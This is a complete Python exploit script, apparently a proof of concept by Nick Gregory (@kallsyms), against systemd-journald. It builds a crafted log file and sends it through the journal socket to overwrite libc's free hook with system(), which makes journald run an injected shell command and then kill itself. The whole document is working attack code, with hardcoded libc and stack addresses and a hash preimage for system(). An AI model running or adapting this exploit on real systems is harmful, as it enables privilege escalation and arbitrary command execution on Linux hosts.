#!/usr/bin/env python3
# Nick Gregory
# @kallsyms

import array
import os
import socket
import struct

TEMPFILE = '/tmp/systemdown_temp'

def p64(n):
    return struct.pack('<Q', n)

class UNIXSocket(object):
    def __init__(self, path):
        self.path = path

    def __enter__(self):
        self.client = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM, 0)
        self.client.connect(self.path)
        return self.client

    def __exit__(self, exc_t, exc_v, traceback):
        self.client.close()

if __name__ == "__main__":
    # Constants that may need to change per-system
    libc = 0x7ffff79e4000
    stack = 0x7fffffffde60

    free_hook = libc + 0x3ed8e8
    system_addr = libc + 0x4f440

    system_preimage = b"Y=J~-Y',Wj(A"  # hash64()s to system_addr

    padding_kvs = 3

    with open(TEMPFILE, 'wb') as log:
        msg = b""
        for _ in range(padding_kvs):
            msg += b"P=\n"

        # msg n is our key that when hashed gives system
        msg += system_preimage + b"\n"

        # next is our command as a binary data block
        cmd = b"echo $(whoami) > /tmp/pwn"
        # be sure to kill journald afterwards so it doesn't lockup
        cmd = b";" + cmd + b";killall -9 /lib/systemd/systemd-journald;"
        msg += b"C\n"
        msg += p64(len(cmd))
        msg += cmd + b"\n"

        # Then we send a large item which breaks the loop
        msg += b"A=" + b"B"*(128*1024*1024) + b"\n"

        # Then fill with as many KVs as we need to get to the right addr
        num_msgs = (((stack - free_hook)//16) - 1)
        num_msgs -= 3  # the three above
        num_msgs -= 7  # added by journald itself

        msg += b"B=\n" * num_msgs

        log.write(msg)

    with UNIXSocket("/run/systemd/journal/socket") as sock:
        with open(TEMPFILE, 'rb') as log:
            sock.sendmsg([b""], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", [log.fileno()]))])

    os.unlink(TEMPFILE)
